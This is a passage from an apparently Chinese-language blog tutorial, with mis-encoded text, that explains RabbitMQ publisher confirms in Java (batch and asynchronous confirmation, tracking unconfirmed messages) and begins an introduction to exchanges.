&#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><blockquote><p>æ‰¹é‡ç¡®è®¤å‘å¸ƒ</p></blockquote><p>ä¸Šé¢é‚£ç§æ–¹å¼éå¸¸æ…¢ï¼Œä¸å•ä¸ªç­‰å¾…ç¡®è®¤æ¶ˆæ¯ç›¸æ¯”ï¼Œå…ˆå‘å¸ƒä¸€æ‰¹æ¶ˆæ¯ç„¶åä¸€èµ·ç¡®è®¤å¯ä»¥æå¤§åœ°æé«˜ååé‡ï¼Œå½“ç„¶è¿™ç§æ–¹å¼çš„ç¼ºç‚¹å°±æ˜¯:å½“å‘ç”Ÿæ•…éšœå¯¼è‡´å‘å¸ƒå‡ºç°é—®é¢˜æ—¶ï¼Œä¸çŸ¥é“æ˜¯å“ªä¸ªæ¶ˆæ¯å‡ºç°é—®é¢˜äº†ï¼Œæˆ‘ä»¬å¿…é¡»å°†æ•´ä¸ªæ‰¹å¤„ç†ä¿å­˜åœ¨å†…å­˜ä¸­ï¼Œä»¥è®°å½•é‡è¦çš„ä¿¡æ¯è€Œåé‡æ–°å‘å¸ƒæ¶ˆæ¯ã€‚å½“ç„¶è¿™ç§æ–¹æ¡ˆä»ç„¶æ˜¯åŒæ­¥çš„ï¼Œä¹Ÿä¸€æ ·é˜»å¡æ¶ˆæ¯çš„å‘å¸ƒã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment">* å‘å¸ƒç¡®è®¤æ¨¡å¼ï¼Œ</span><br><span class="hljs-comment">* 1ã€å•ä¸ªç¡®è®¤</span><br><span class="hljs-comment">* 2ã€æ‰¹é‡ç¡®è®¤</span><br><span class="hljs-comment">* 3ã€å¼‚æ­¥æ‰¹é‡ç¡®è®¤</span><br><span class="hljs-comment">* */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ComfirmMessage</span> &#123;<br><br>    <span class="hljs-comment">// æ‰¹é‡å‘æ¶ˆæ¯çš„ä¸ªæ•°</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">MESSAGE_COUNT</span> <span class="hljs-operator">=</span> <span class="hljs-number">1000</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//2ã€æ‰¹é‡ç¡®è®¤</span><br>        <span class="hljs-comment">// å‘å¸ƒ1000ä¸ªæ‰¹é‡ç¡®è®¤æ¶ˆæ¯ï¼Œè€—æ—¶37ms</span><br>        ComfirmMessage.publishMessageBatch();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">publishMessageBatch</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> RabbitMqUtils.getChannel();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">queueName</span> <span class="hljs-operator">=</span> UUID.randomUUID().toString();<br>        channel.queueDeclare(queueName,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">null</span>);<br><br>        <span class="hljs-comment">// å¼€å¯å‘å¸ƒç¡®è®¤</span><br>        channel.confirmSelect();<br>        <span class="hljs-comment">// å¼€å§‹æ—¶é—´</span><br>        <span class="hljs-type">long</span> <span class="hljs-variable">begin</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br><br>        <span class="hljs-comment">// æ‰¹é‡ç¡®è®¤æ¶ˆæ¯å¤§å°</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">batchSize</span> <span class="hljs-operator">=</span> <span class="hljs-number">1000</span>;<br><br>        <span class="hljs-comment">// æ‰¹é‡å‘é€ æ‰¹é‡ç¡®è®¤</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; MESSAGE_COUNT; i++) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> i + <span class="hljs-string">&quot;&quot;</span>;<br>            channel.basicPublish(<span class="hljs-string">&quot;&quot;</span>,queueName,<span class="hljs-literal">null</span>,message.getBytes(StandardCharsets.UTF_8));<br><br>            <span class="hljs-comment">// åˆ¤æ–­è¾¾åˆ°100æ¡æ¶ˆæ¯çš„æ—¶å€™ï¼Œæ‰¹é‡ç¡®è®¤ä¸€æ¬¡</span><br>            <span class="hljs-keyword">if</span> (i%batchSize == <span class="hljs-number">0</span>)&#123;<br>                <span class="hljs-comment">// ç¡®è®¤å‘å¸ƒ</span><br>                channel.waitForConfirms();<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">// ç»“æŸæ—¶é—´</span><br>        <span class="hljs-type">long</span> <span class="hljs-variable">end</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br>        System.out.println(<span class="hljs-string">&quot;å‘å¸ƒ&quot;</span>+MESSAGE_COUNT+<span class="hljs-string">&quot;ä¸ªæ‰¹é‡ç¡®è®¤æ¶ˆæ¯ï¼Œè€—æ—¶&quot;</span>+ (end - begin) + <span class="hljs-string">&quot;ms&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>å¼‚æ­¥å‘å¸ƒç¡®è®¤</p></blockquote><p>å¼‚æ­¥ç¡®è®¤è™½ç„¶ç¼–ç¨‹é€»è¾‘æ¯”ä¸Šä¸¤ä¸ªè¦å¤æ‚ï¼Œä½†æ˜¯æ€§ä»·æ¯”æœ€é«˜ï¼Œæ— è®ºæ˜¯å¯é æ€§è¿˜æ˜¯æ•ˆç‡éƒ½æ²¡å¾—è¯´ï¼Œä»–æ˜¯åˆ©ç”¨å›è°ƒå‡½æ•°æ¥è¾¾åˆ°æ¶ˆæ¯å¯é æ€§ä¼ é€’çš„,è¿™ä¸ªä¸­é—´ä»¶ä¹Ÿæ˜¯é€šè¿‡å‡½æ•°å›è°ƒæ¥ä¿è¯æ˜¯å¦æŠ•é€’æˆåŠŸï¼Œä¸‹é¢å°±è®©æˆ‘ä»¬æ¥è¯¦ç»†è®²è§£å¼‚æ­¥ç¡®è®¤æ˜¯æ€ä¹ˆå®ç°çš„ã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112161922791.png" alt="image-20230112161922791" /></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment">* å‘å¸ƒç¡®è®¤æ¨¡å¼ï¼Œ</span><br><span class="hljs-comment">* 1ã€å•ä¸ªç¡®è®¤</span><br><span class="hljs-comment">* 2ã€æ‰¹é‡ç¡®è®¤</span><br><span class="hljs-comment">* 3ã€å¼‚æ­¥æ‰¹é‡ç¡®è®¤</span><br><span class="hljs-comment">* */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ComfirmMessage</span> &#123;<br><br>    <span class="hljs-comment">// æ‰¹é‡å‘æ¶ˆæ¯çš„ä¸ªæ•°</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">MESSAGE_COUNT</span> <span class="hljs-operator">=</span> <span class="hljs-number">1000</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//3ã€å¼‚æ­¥æ‰¹é‡ç¡®è®¤</span><br>        <span class="hljs-comment">// å‘å¸ƒ1000ä¸ªå¼‚æ­¥ç¡®è®¤æ¶ˆæ¯ï¼Œè€—æ—¶36ms</span><br>        ComfirmMessage.publicMessageAsync();<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">publicMessageAsync</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> RabbitMqUtils.getChannel();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">queueName</span> <span class="hljs-operator">=</span> UUID.randomUUID().toString();<br>        channel.queueDeclare(queueName,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">null</span>);<br><br>        <span class="hljs-comment">// å¼€å¯å‘å¸ƒç¡®è®¤</span><br>        channel.confirmSelect();<br>        <span class="hljs-comment">// å¼€å§‹æ—¶é—´</span><br>        <span class="hljs-type">long</span> <span class="hljs-variable">begin</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br><br>        <span class="hljs-comment">// æ¶ˆæ¯ç¡®è®¤æˆåŠŸå›è°ƒå‡½æ•°</span><br>        <span class="hljs-type">ConfirmCallback</span> <span class="hljs-variable">ackCallback</span> <span class="hljs-operator">=</span> (deliveryTag,multiply) -&gt; &#123;<br>            System.out.println(<span class="hljs-string">&quot;ç¡®è®¤çš„æ¶ˆæ¯ï¼š&quot;</span>+deliveryTag);<br>        &#125;;<br><br>        <span class="hljs-comment">// æ¶ˆæ¯ç¡®è®¤å¤±è´¥å›è°ƒå‡½æ•°</span><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        * å‚æ•°1ï¼šæ¶ˆæ¯çš„æ ‡è®°</span><br><span class="hljs-comment">        * å‚æ•°2ï¼šæ˜¯å¦ä¸ºæ‰¹é‡ç¡®è®¤</span><br><span class="hljs-comment">        * */</span><br>        <span class="hljs-type">ConfirmCallback</span> <span class="hljs-variable">nackCallback</span> <span class="hljs-operator">=</span> (deliveryTag,multiply) -&gt; &#123;<br>            System.out.println(<span class="hljs-string">&quot;æœªç¡®è®¤çš„æ¶ˆæ¯ï¼š&quot;</span>+deliveryTag);<br>        &#125;;<br><br>        <span class="hljs-comment">// å‡†å¤‡æ¶ˆæ¯çš„ç›‘å¬å™¨ï¼Œç›‘å¬å“ªäº›æ¶ˆæ¯æˆåŠŸï¼Œå“ªäº›æ¶ˆæ¯å¤±è´¥</span><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        * å‚æ•°1ï¼šç›‘å¬å“ªäº›æ¶ˆæ¯æˆåŠŸ</span><br><span class="hljs-comment">        * å‚æ•°2ï¼šç›‘å¬å“ªäº›æ¶ˆæ¯å¤±è´¥</span><br><span class="hljs-comment">        * */</span><br>        channel.addConfirmListener(ackCallback,nackCallback);<br><br>        <span class="hljs-comment">// æ‰¹é‡å‘é€æ¶ˆæ¯</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; MESSAGE_COUNT; i++) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;æ¶ˆæ¯&quot;</span> + i;<br>            channel.basicPublish(<span class="hljs-string">&quot;&quot;</span>,queueName,<span class="hljs-literal">null</span>,message.getBytes(StandardCharsets.UTF_8));<br>        &#125;<br><br>        <span class="hljs-comment">// ç»“æŸæ—¶é—´</span><br>        <span class="hljs-type">long</span> <span class="hljs-variable">end</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br>        System.out.println(<span class="hljs-string">&quot;å‘å¸ƒ&quot;</span>+MESSAGE_COUNT+<span class="hljs-string">&quot;ä¸ªå¼‚æ­¥ç¡®è®¤æ¶ˆæ¯ï¼Œè€—æ—¶&quot;</span>+ (end - begin) + <span class="hljs-string">&quot;ms&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¦‚ä½•å¤„ç†å¼‚æ­¥æœªç¡®è®¤ä¿¡æ¯ï¼Ÿ</p><p><mark>è¯¥å®ç°è¿˜æœ‰äº›é—®é¢˜æ²¡æœ‰æ•´æ˜ç™½ï¼Œä»¥åæœ‰æ—¶é—´åœ¨æ¥ç©</mark></p><p>æœ€å¥½çš„è§£å†³æ–¹æ¡ˆå°±æ˜¯æŠŠæœªç¡®è®¤çš„æ¶ˆæ¯æ”¾åˆ°ä¸€ä¸ªåŸºäºå†…å­˜çš„èƒ½è¢«å‘å¸ƒçº¿ç¨‹è®¿é—®çš„é˜Ÿåˆ—ï¼Œæ¯”å¦‚è¯´ç”¨ConcurrentLinkedQueueè¿™ä¸ªé˜Ÿåˆ—åœ¨confirm callbacksä¸å‘å¸ƒçº¿ç¨‹ä¹‹é—´è¿›è¡Œæ¶ˆæ¯çš„ä¼ é€’</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ComfirmMessage</span> &#123;<br><br>    <span class="hljs-comment">// æ‰¹é‡å‘æ¶ˆæ¯çš„ä¸ªæ•°</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">MESSAGE_COUNT</span> <span class="hljs-operator">=</span> <span class="hljs-number">1000</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//3ã€å¼‚æ­¥æ‰¹é‡ç¡®è®¤</span><br>        <span class="hljs-comment">// å‘å¸ƒ1000ä¸ªå¼‚æ­¥ç¡®è®¤æ¶ˆæ¯ï¼Œè€—æ—¶36ms</span><br>        ComfirmMessage.publicMessageAsync();<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">publicMessageAsync</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> RabbitMqUtils.getChannel();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">queueName</span> <span class="hljs-operator">=</span> UUID.randomUUID().toString();<br>        channel.queueDeclare(queueName,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">null</span>);<br><br>        <span class="hljs-comment">// å¼€å¯å‘å¸ƒç¡®è®¤</span><br>        channel.confirmSelect();<br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        * çº¿ç¨‹å®‰å…¨æœ‰åºçš„ä¸€ä¸ªå“ˆå¸Œè¡¨ é€‚ç”¨äºé«˜å¹¶å‘çš„æƒ…å†µä¸‹</span><br><span class="hljs-comment">        * 1ã€è½»æ¾åœ°å°†åºå·ä¸æ¶ˆæ¯è¿›è¡Œå…³è”</span><br><span class="hljs-comment">        * 2ã€è½»æ¾åœ°æ‰¹é‡åˆ é™¤ï¼Œåªè¦ç»™åˆ°åºå·</span><br><span class="hljs-comment">        * 3ã€æ”¯æŒé«˜å¹¶å‘</span><br><span class="hljs-comment">        * */</span><br>        ConcurrentSkipListMap&lt;Long,String&gt; outstandingConfirms = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentSkipListMap</span>&lt;&gt;();<br><br>        <span class="hljs-comment">// æ¶ˆæ¯ç¡®è®¤æˆåŠŸå›è°ƒå‡½æ•°</span><br>        <span class="hljs-type">ConfirmCallback</span> <span class="hljs-variable">ackCallback</span> <span class="hljs-operator">=</span> (deliveryTag,multiply) -&gt; &#123;<br>            <span class="hljs-comment">// åˆ é™¤åˆ°å·²ç»ç¡®è®¤çš„æ¶ˆæ¯ï¼Œå‰©ä¸‹çš„å°±æ˜¯æœªç¡®è®¤çš„æ¶ˆæ¯</span><br>            <span class="hljs-keyword">if</span>(multiply)&#123;<br>                ConcurrentNavigableMap&lt;Long, String&gt; confiremed = outstandingConfirms.headMap(deliveryTag);<br>                confiremed.clear();<br>            &#125;<span class="hljs-keyword">else</span> &#123;<br>                outstandingConfirms.remove(deliveryTag);<br>            &#125;<br><br>            System.out.println(<span class="hljs-string">&quot;ç¡®è®¤çš„æ¶ˆæ¯ï¼š&quot;</span>+deliveryTag);<br>        &#125;;<br><br>        <span class="hljs-comment">// æ¶ˆæ¯ç¡®è®¤å¤±è´¥å›è°ƒå‡½æ•°</span><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        * å‚æ•°1ï¼šæ¶ˆæ¯çš„æ ‡è®°</span><br><span class="hljs-comment">        * å‚æ•°2ï¼šæ˜¯å¦ä¸ºæ‰¹é‡ç¡®è®¤</span><br><span class="hljs-comment">        * */</span><br>        <span class="hljs-type">ConfirmCallback</span> <span class="hljs-variable">nackCallback</span> <span class="hljs-operator">=</span> (deliveryTag,multiply) -&gt; &#123;<br>            <span class="hljs-comment">// æ‰“å°ä¸€ä¸‹æœªç¡®è®¤çš„æ¶ˆæ¯éƒ½æœ‰å“ªäº›</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> outstandingConfirms.get(deliveryTag);<br>            System.out.println(<span class="hljs-string">&quot;æœªç¡®è®¤çš„æ¶ˆæ¯æ˜¯ï¼š&quot;</span> + message +<span class="hljs-string">&quot;æœªç¡®è®¤çš„æ¶ˆæ¯tagï¼š&quot;</span> + deliveryTag);<br>        &#125;;<br><br>        <span class="hljs-comment">// å‡†å¤‡æ¶ˆæ¯çš„ç›‘å¬å™¨ï¼Œç›‘å¬å“ªäº›æ¶ˆæ¯æˆåŠŸï¼Œå“ªäº›æ¶ˆæ¯å¤±è´¥</span><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        * å‚æ•°1ï¼šç›‘å¬å“ªäº›æ¶ˆæ¯æˆåŠŸ</span><br><span class="hljs-comment">        * å‚æ•°2ï¼šç›‘å¬å“ªäº›æ¶ˆæ¯å¤±è´¥</span><br><span class="hljs-comment">        * */</span><br>        channel.addConfirmListener(ackCallback,nackCallback);<br><br>        <span class="hljs-comment">// å¼€å§‹æ—¶é—´</span><br>        <span class="hljs-type">long</span> <span class="hljs-variable">begin</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br><br>        <span class="hljs-comment">// æ‰¹é‡å‘é€æ¶ˆæ¯</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; MESSAGE_COUNT; i++) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;æ¶ˆæ¯&quot;</span> + i;<br>            channel.basicPublish(<span class="hljs-string">&quot;&quot;</span>,queueName,<span class="hljs-literal">null</span>,message.getBytes(StandardCharsets.UTF_8));<br><br>            <span class="hljs-comment">// æ­¤å¤„è®°å½•ä¸‹æ‰€æœ‰è¦å‘é€çš„æ¶ˆæ¯çš„æ€»å’Œ</span><br>            outstandingConfirms.put(channel.getNextPublishSeqNo(),message);<br>        &#125;<br><br><br><br>        <span class="hljs-comment">// ç»“æŸæ—¶é—´</span><br>        <span class="hljs-type">long</span> <span class="hljs-variable">end</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br>        System.out.println(<span class="hljs-string">&quot;å‘å¸ƒ&quot;</span>+MESSAGE_COUNT+<span class="hljs-string">&quot;ä¸ªå¼‚æ­¥ç¡®è®¤æ¶ˆæ¯ï¼Œè€—æ—¶&quot;</span>+ (end - begin) + <span class="hljs-string">&quot;ms&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>ä¸‰ç§å‘å¸ƒç¡®è®¤é€Ÿåº¦å¯¹æ¯”</p></blockquote><table><thead><tr><th style="text-align:center">å‘å¸ƒæ–¹å¼</th><th style="text-align:center">ç‰¹ç‚¹</th></tr></thead><tbody><tr><td style="text-align:center">å•ç‹¬å‘å¸ƒæ¶ˆæ¯</td><td style="text-align:center">åŒæ­¥ç­‰å¾…ç¡®è®¤ï¼Œç®€å•ï¼Œä½†ååé‡éå¸¸æœ‰é™</td></tr><tr><td style="text-align:center">æ‰¹é‡å‘å¸ƒæ¶ˆæ¯</td><td style="text-align:center">æ‰¹é‡åŒæ­¥ç­‰å¾…ç¡®è®¤ï¼Œç®€å•ï¼Œåˆç†çš„ååé‡ï¼Œä¸€æ—¦å‡ºç°é—®é¢˜ä½†å¾ˆéš¾æ¨æ–­å‡ºæ˜¯é‚£æ¡æ¶ˆæ¯å‡ºç°äº†é—®é¢˜ã€‚</td></tr><tr><td style="text-align:center">å¼‚æ­¥å¤„ç†</td><td style="text-align:center">æœ€ä½³æ€§èƒ½å’Œèµ„æºä½¿ç”¨ï¼Œåœ¨å‡ºç°é”™è¯¯çš„æƒ…å†µä¸‹å¯ä»¥å¾ˆå¥½åœ°æ§åˆ¶ï¼Œä½†æ˜¯å®ç°èµ·æ¥ç¨å¾®éš¾äº›</td></tr></tbody></table><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112163348009.png" alt="image-20230112163348009" /></p><h1 id="6-äº¤æ¢æœº"><a class="markdownIt-Anchor" href="#6-äº¤æ¢æœº"></a> 6. äº¤æ¢æœº</h1><h2 id="61-äº¤æ¢æœºç®€ä»‹"><a class="markdownIt-Anchor" href="#61-äº¤æ¢æœºç®€ä»‹"></a> 6.1 äº¤æ¢æœºç®€ä»‹</h2><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112183612984.png" alt="image-20230112183612984" /></p><blockquote><p>ä»‹ç»</p></blockquote><ol><li><p>RabbitMQæ¶ˆæ¯ä¼ é€’æ¨¡å‹çš„æ ¸å¿ƒæ€æƒ³æ˜¯ï¼š<code>ç”Ÿäº§è€…ç”Ÿäº§çš„æ¶ˆæ¯ä»ä¸ä¼šç›´æ¥å‘é€åˆ°é˜Ÿåˆ—</code>ã€‚å®é™…ä¸Šï¼Œé€šå¸¸ç”Ÿäº§è€…ç”šè‡³éƒ½ä¸çŸ¥é“è¿™äº›æ¶ˆæ¯ä¼ é€’ä¼ é€’åˆ°äº†å“ªäº›é˜Ÿåˆ—ä¸­ã€‚</p></li><li><p>ç›¸åï¼Œç”Ÿäº§è€…åªèƒ½å°†æ¶ˆæ¯å‘é€åˆ°äº¤æ¢æœº(exchange)ï¼Œäº¤æ¢æœºå·¥ä½œçš„å†…å®¹éå¸¸ç®€å•ï¼Œä¸€æ–¹é¢å®ƒæ¥æ”¶æ¥è‡ªç”Ÿäº§è€…çš„æ¶ˆæ¯ï¼Œå¦ä¸€æ–¹é¢å°†å®ƒä»¬æ¨å…¥é˜Ÿåˆ—ã€‚äº¤æ¢æœºå¿…é¡»ç¡®åˆ‡çŸ¥é“å¦‚ä½•å¤„ç†æ”¶åˆ°çš„æ¶ˆæ¯ã€‚æ˜¯åº”è¯¥æŠŠè¿™äº›æ¶ˆæ¯æ”¾åˆ°ç‰¹å®šé˜Ÿåˆ—è¿˜æ˜¯è¯´æŠŠä»–ä»¬åˆ°è®¸å¤šé˜Ÿåˆ—ä¸­è¿˜æ˜¯è¯´åº”è¯¥ä¸¢å¼ƒå®ƒä»¬ã€‚è¿™å°±çš„ç”±äº¤æ¢æœºçš„ç±»å‹æ¥å†³å®šã€‚</p></li><li><p>æ€»å…±æœ‰ä»¥ä¸‹å‡ ä¸ªç±»å‹ï¼š</p><p>ç›´æ¥ï¼ˆdirectï¼‰ã€ä¸»é¢˜ï¼ˆtopicï¼‰ã€æ ‡é¢˜ï¼ˆheadersï¼‰ã€æ‰‡å‡ºï¼ˆfanoutï¼‰</p></li><li><p>æ— åäº¤æ¢æœºï¼š</p><p>åœ¨æœ¬æ•™ç¨‹çš„å‰é¢éƒ¨åˆ†æˆ‘ä»¬å¯¹exchangeä¸€æ— æ‰€çŸ¥ï¼Œä½†ä»ç„¶èƒ½å¤Ÿå°†æ¶ˆæ¯å‘é€åˆ°é˜Ÿåˆ—ã€‚ä¹‹å‰èƒ½å®ç°çš„åŸå› æ˜¯å› ä¸ºæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯é»˜è®¤äº¤æ¢ï¼Œæˆ‘ä»¬é€šè¿‡ç©ºå­—ç¬¦ä¸²(&quot;&quot;)è¿›è¡Œæ ‡è¯†ã€‚</p><p>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯äº¤æ¢æœºçš„åç§°ã€‚ç©ºå­—ç¬¦ä¸²è¡¨ç¤ºé»˜è®¤æˆ–æ— åç§°äº¤æ¢æœº:æ¶ˆæ¯èƒ½è·¯ç”±å‘é€åˆ°é˜Ÿåˆ—ä¸­å…¶å®æ˜¯ç”±routingKey(bindingkey)ç»‘å®škeyæŒ‡å®šçš„ï¼Œå¦‚æœå®ƒå­˜åœ¨çš„è¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">channel.basiPublish(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;hello&quot;</span>,<span 